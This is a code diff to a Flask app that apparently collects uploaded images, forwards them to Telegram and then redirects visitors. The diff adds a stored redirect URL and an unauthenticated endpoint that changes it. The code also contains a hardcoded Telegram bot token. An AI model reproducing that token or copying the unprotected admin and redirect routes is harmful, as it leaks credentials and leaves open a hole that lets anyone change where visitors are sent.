@@ -11,6 +11,20 @@ app = Flask(__name__, static_url_path='/static')
 if not os.path.exists('static'):
     os.makedirs('static')
 
+# Store the redirect URL in a simple text file
+REDIRECT_URL_FILE = 'redirect_url.txt'
+if not os.path.exists(REDIRECT_URL_FILE):
+    with open(REDIRECT_URL_FILE, 'w') as f:
+        f.write('https://example.com')  # Default redirect URL
+
+def get_redirect_url():
+    with open(REDIRECT_URL_FILE, 'r') as f:
+        return f.read().strip()
+
+def set_redirect_url(url):
+    with open(REDIRECT_URL_FILE, 'w') as f:
+        f.write(url)
+
 # Telegram Bot API details
 TELEGRAM_BOT_TOKEN = '7125865296:AAHI_w7KGa152kCOVPNgsavTNIfatUR0hX8'
 TELEGRAM_CHAT_ID = '5197344486'
@@ -52,14 +66,21 @@ def upload_image():
 # Serve the main page
 @app.route('/')
 def index():
-    return render_template('index.html')
+    return render_template('index.html', redirect_url=get_redirect_url())
 
 # Serve the admin page
 @app.route('/admin')
 def admin():
     image_files = os.listdir('static')
     image_files = [f'static/{file}' for file in image_files if file.endswith('.png')]
-    return render_template('admin.html', images=image_files)
+    return render_template('admin.html', images=image_files, redirect_url=get_redirect_url())
+
+# Handle setting the redirect URL
+@app.route('/set_redirect_url', methods=['POST'])
+def set_redirect():
+    url = request.form.get('redirect_url')
+    set_redirect_url(url)
+    return redirect(url_for('admin'))
 
 # Serve the lightweight mobile-friendly admin page
 @app.route('/admin2')
